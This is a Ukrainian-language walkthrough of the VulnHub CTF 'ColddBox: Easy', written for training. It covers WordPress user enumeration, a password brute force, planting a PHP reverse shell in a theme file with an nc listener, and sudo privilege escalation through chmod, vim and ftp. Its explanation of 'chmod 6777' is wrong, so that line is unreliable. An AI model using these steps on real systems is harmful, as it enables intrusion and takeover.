В цьому документі наведено розгорнуте пояснення до завдання **Capture the Flag (CTF)**, опубліковане на сайті **VulnHub** автором **"C0ldd"**. Відповідно до наданої автором інформації, рівень складності цього CTF — **ЛЕГКИЙ**, а мета — отримати **root-доступ** до цільової машини та знайти **три файли-флаги**.  

Для проходження цього CTF необхідно володіти:
- **базовим знанням команд Linux**
- **розумінням мережевих сервісів**
- **навичками використання інструментів для тестування на проникнення**
- **базовим розумінням мов програмування (Python, PHP)**

Завантажити CTF можна [тут](https://www.vulnhub.com/entry/colddbox-easy,586/).  


> ⚠️ **Примітка**: Для запуску всіх цих вразливих машин було використано **Oracle VirtualBox**. Для проходження CTF використано **Kali Linux** або  **ParrotOS** як атакуючу машину. Використані методики призначені **виключно для освітніх цілей**. <br>
**Відповідальность за їх застосування проти будь-яких інших цілей буде визначатись відповідно чинному законодавству.**  

---

## **Короткий огляд кроків вирішення CTF**

1. Отримати **IP-адресу цільової машини** (netdiscover).
2. Просканувати **відкриті порти цільової машини** (**nmap**).  
3. Перевірити **HTTP-сервіс** та знайти підказки.  
4. Зробити підвищення привілеїв  
   

---

### 1. Отримання **IP-адресу цільової машини**

```sh
sudo netdiscover -r 10.0.2.0/24
```

***** Питання: яка з команд будк працювати швидче?
sudo netdiscover
або 
sudo netdiscover -r 10.0.2.0/24 


### 2. Сканування **відкритих портів цільової машини**.

Можна зробити різними шляхами:

```sh
sudo nmap -A --reason 10.0.2.12
```
або
```sh
sudo nmap -sV --reason 10.0.2.12
```
***** Питання: в чому різниця між цима командами (декілька вірних варіантів)

Отримуємо наступне:

![приклад використання nmap](image.png)


### 3. Дослідження вебсервера

У браузері відкриваємо http://10.0.2.12,  отримуємо:

![ColddBox](image-1.png)

Скористуємось **login** та отримуємо типове запрошення від **wordpress**:

![alt text](image-2.png)

Це може бути одним із варіантів входу в систему, але будуть потрібні креденшіали.

То проведемо дослідження структури вебсайту за допомогою **gobuster**:



gobuster dir -u http://10.0.2.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![Результати:](image-4.png)

Перевірка доступних посилань дає результат лише по останньому, то маємо
такий результат:

![результат:](image-5.png)

Визначили трьох користувачів, далі потрібно більш детально дослідити вордпресс на наявність додаткової інформації.

wpscan --url http://10.0.2.12/ -e

Знову знаходимо трьох користувачів, вся інша інформація не несе цінності.

![користувачі:](image-6.png)

Нвступний крок - брутфорс за словником.
***** Питання: чому ми обираємо саме користувача "c0ldd"  для проведення брутфорсу?

```sh
wpscan --url http://10.0.2.12/ -U c0ldd -P /usr/share/wordlists/rockyou.txt
```

Після виконання маємо наступний результат:

![логін:пароль](image-7.png)

Далі робимо логін в вордпрес та шукаємо можливості впровадження коду для створення реверс-шелу. Для цього переходимо в Apearence->Editor.

![Apearence->Editor](image-8.png)

Наступним кроком маємо встановити, який з темплейтів ми зможемо модифікувти таким чином, щоб отримати реверс-шел.
Для прикладу, скористаємось існуючим репозіторієм на ГітХабі:
https://github.com/pentestmonkey/php-reverse-shell

![php-reverse-shell.php](image-10.png)

Зазвичай, код для реверс-шелу може бути доданий або в шаблон "Footer", або в "404".
То як раз і почнемо з "Footer".

![FooterTemplateCode.php](image-11.png)

Замінюємо код у "footer.php" на код з "php-reverse-shell.php",
та додаємо кастомізацію.

![change footer.php](image-12.png)

В терміналі Калі виконуємо наступну команду:

```sh
nc -lvnp 3421
```
-l - слухати
-v - балакучість
-n - не перевіряти DNS (швидче працює)
-p - вказати номер порта

Далі робимо оновлення основної сторінки вебсервера та маємо наступний результат:

![reverse-shell-is-working](image-13.png)

Команда **`pty.spawn("/bin/bash")` покращує таку оболонку**, перетворюючи її на більш «справжню» інтерактивну сесію Bash.

python3 -c 'import pty; pty.spawn("/bin/bash")'
 Як результат отримуємо повноцінний командний рядок bash:

![alt text](image-14.png)


### 4. Підвищення привілеїв

Зараз, коли ми знаходимося всередині сервера, давайте пошукаємо файли, які містять важливу інформацію. На вебсайті WordPress існує основний файл, що містить базові конфігураційні дані сайту, і він називається **wp-config.php**. Ми можемо знайти цей файл у **/var/www/html**

![wp-config.php](image-15.png)

Передивляємось зміст файлу **wp-config.php** за допомогою утіліти **cat**:

![cat wpconfig](image-16.png)

Спробуємо зайти в сисетму під користовачем "c0dd" зі знайденим паролем:

su c0ldd

отримуємо результат:

![c0ldd user](image-17.png)

перейдемо до домашнього каталогу користувача та дослідемо його зміст, 
та виведемо на термінал зміст файлу, що знайдено:

![users.txt](image-18.png)

Декодуємо за допомогою **www.base64decode.org** та отримуємо такий результат-привітання:

![alt text](image-19.png)

Визначимо, які саме повноваження є за допомогою команди:

![sudo -l](image-21.png)

Ми можемо підвищити свої привілеї до root, використовуючи будь-яку з цих трьох команд, і спробуємо всі три способи. Перед тим як почати, існує вебсайт під назвою GTFOBins, який містить різноманітні прийоми для обходу механізмів безпеки, і ми будемо використовувати цей сайт як допоміжний ресурс під час виконання наших завдань.

https://gtfobins.github.io/

#### 4.1. Використання **chmod**

Небезпека полягає в тому, що якщо цьому бінарному файлу дозволено виконуватися від імені суперкористувача через **sudo**, він не скидає підвищені привілеї й може бути використаний для доступу до файлової системи, підвищення привілеїв або збереження привілейованого доступу.

![sudo chmod](image-22.png)

Скористаємось цім методом, щоб змінити права доступу до файлу, який обмежений для користувача з низькими привілеями, і зробити його доступним для всіх користувачів.
У нашому випадку файл, до якого потрібно отримати доступ, — це root-файл. Зробимо це за допомогою команди:

```sh
LFILE=root
```

Після цього виконаємо команду:

```sh
sudo chmod 6777 $LFILE
```

Пояснення:

sudo — запускає команду від імені root (superuser).
chmod 6777:
6 — надає власнику файлу права на читання та запис (read, write).
777 — надає всім користувачам права на читання, запис і виконання (read, write, execute).

Після виконання цієї пари команд маємо наступний результат:

![cat root](image-23.png)

Декодуємо base64 за допомогою командного рядку:

![Felicidades](image-24.png)

Переклад з іспанської: "Вітаємо, машину завершено!"

#### 4.2. Використання **vim**

Оскількі **root** доступа все ще не маємо, то перейдемо до наступного крока.

![vim1](image-25.png)

Запускаємо **vim** за допомогою **sudo**:

![alt text](image-26.png)

Отримуємо **root** в **vim** 

![vim root](image-28.png)

Для виходу користуємось: **Shift + zz**, потім натискаємо **Enter**.
(“Shift + zq” — вийти без збереження змін.)

#### 4.3. Використання **ftp**

Знову користуємось порадами з сайту https://gtfobins.github.io/gtfobins/ftp/#sudo:

![sudo ftp](image-30.png)

```sh
sudo ftp
!/bin/bash
```

![root ftp](image-31.png)

#### Вплив загрози:

Привілеї root: 
- зловмисник може змінювати паролі користувачів або створювати нових користувачів.
- зловмисник має доступ до зміни файлу sudoers, який використовується для надання або обмеження прав користувачів.
